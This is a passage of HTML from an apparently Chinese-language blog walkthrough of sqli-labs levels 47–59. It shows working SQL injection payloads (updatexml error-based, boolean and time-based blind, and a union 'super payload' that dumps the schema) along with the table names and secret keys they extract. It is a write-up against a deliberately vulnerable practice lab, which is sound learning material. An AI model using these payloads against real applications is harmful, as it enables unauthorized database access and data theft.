class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121132459622.png" alt="image-20210121132459622"></p><h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>直接报错注入</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span>&#x27;AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121135008540.png" alt="image-20210121135008540"></p><h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>会报错，但是报错信息不回显</p><p>看来只能盲注了</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">left</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">1</span>)=<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121140852393.png" alt="image-20210121140852393"></p><h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>报错不回显</p><p>一样用盲注</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27; and left(version(),<span class="hljs-number">1</span>)=<span class="hljs-number">5</span><span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121141804847.png" alt="image-20210121141804847"></p><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>回显报错</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span> AND updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121142547017.png" alt="image-20210121142547017"></p><h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>报错注入</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121142832726.png" alt="image-20210121142832726"></p><h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>不回显报错</p><p>盲注</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-keyword">sort</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">left</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">1</span>)=<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121143303034.png" alt="image-20210121143303034"></p><h2 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">2</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>报错不回显</p><p>无论sort等于什么，都回显同样的内容，也没办法布尔盲注了，只能时间盲注了</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?sort=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>(<span class="hljs-params">database</span>()</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121145644986.png" alt="image-20210121145644986"></p><p>要从CHALLENGES 这个database中找出secret key的值</p><p>用id作注入点</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121150912785.png" alt="image-20210121150912785"></p><p> 接下来要看challenges的表名、字段名</p><p>使用超级payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>找到信息</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; T7AX15TTDL &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; T7AX15TTDL &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; T7AX15TTDL &gt; secret_NB98<span class="hljs-string">|</span><br>[ challenges ] &gt; T7AX15TTDL &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><p>再次使用超级payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (challenges.T7AX15TTDL) <span class="hljs-keyword">where</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_NB98,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121154651410.png" alt="image-20210121154651410"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">00</span>QTSD<span class="hljs-number">2</span><span class="hljs-symbol">NrEA450</span>P<span class="hljs-number">4</span>Dx<span class="hljs-number">0</span>Ebl<span class="hljs-number">68</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121154726007.png" alt="image-20210121154726007"></p><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p> 一样的，找key</p><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1)%23<br></code></pre></td></tr></table></figure><p>报表、字段</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; F9CD4IEXCM &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; F9CD4IEXCM &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; F9CD4IEXCM &gt; secret_XYU3<span class="hljs-string">|</span><br>[ challenges ] &gt; F9CD4IEXCM &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><p>爆key</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (challenges.F9CD4IEXCM) where (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_XYU3,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121155207034.png" alt="image-20210121155207034"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">66ochPNMZSpRBWYs6isAniPu <br></code></pre></td></tr></table></figure><h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>爆表和字段</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; secret_9O3N<span class="hljs-string">|</span><br>[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><p>爆key</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (challenges<span class="hljs-number">.4</span>CGK8MNQEA) <span class="hljs-keyword">where</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_9O3N,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121155715020.png" alt="image-20210121155715020"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">CivPbcRci7gkyld4mT8yk6K7<br></code></pre></td></tr></table></figure><h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;%23<br></code></pre></td></tr></table></figure><p>爆表和字段</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; IAZ0INFM54 &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; IAZ0INFM54 &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; IAZ0INFM54 &gt; secret_OPLK<span class="hljs-string">|</span><br>[ challenges ] &gt; IAZ0INFM54 &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><p>爆key</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (challenges.IAZ0INFM54) <span class="hljs-keyword">where</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_OPLK,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121160120151.png" alt="image-20210121160120151"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">COwmHaOTl7yQlbqef4fNntlx<br></code></pre></td></tr></table></figure><h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure><p>union select 的值出乎所料</p><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121160531439.png" alt="image-20210121160531439"></p><p>但是报错还是会的</p><p>所以用报错注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> <span class="hljs-built_in">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121170446791.png" alt="image-20210121170446791"></p><p>爆出表名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171127295.png" alt="image-20210121171127295"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4Z1LZW5DB9<br></code></pre></td></tr></table></figure><p>爆出字段名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-function">AND <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;4Z1LZW5DB9&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171340552.png" alt="image-20210121171340552"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">secret_0ICC<br></code></pre></td></tr></table></figure><p>爆出要的数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_0ICC) <span class="hljs-keyword">from</span> <span class="hljs-symbol">`4Z1LZW5DB9`</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171641645.png" alt="image-20210121171641645"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">alKM<span class="hljs-symbol">NGS3</span>OPtJlcDZ<span class="hljs-number">05</span>HkP<span class="hljs-number">0</span><span class="hljs-symbol">NH</span><br></code></pre></td></tr></table></figure><p>最后看了看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$unames</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<br><span class="hljs-variable">$pass</span> = (<span class="hljs-variable">$unames</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. <span class="hljs-variable">$unames</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .<span class="hljs-variable">$pass</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<br></code></pre></td></tr></table></figure><p>id只是作为数组的索引而已，怪不得没有想要的东西回显</p><h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>闭合</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure><p>爆出表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172236744.png" alt="image-20210121172236744"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">881IWOX5RE<br></code></pre></td></tr></table></figure><p>爆出字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;881IWOX5RE&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172336841.png" alt="image-20210121172336841"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">secret_UPSN</span><br></code></pre></td></tr></table></figure><p>爆出数据</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> group_concat(secret_UPSN) <span class="hljs-keyword">from</span> `<span class="hljs-number">881</span>IWOX5RE`),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172607215.png" alt="image-20210121172607215"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">7</span>KBs<span class="hljs-number">5</span>lsx<span class="hljs-number">2</span><span 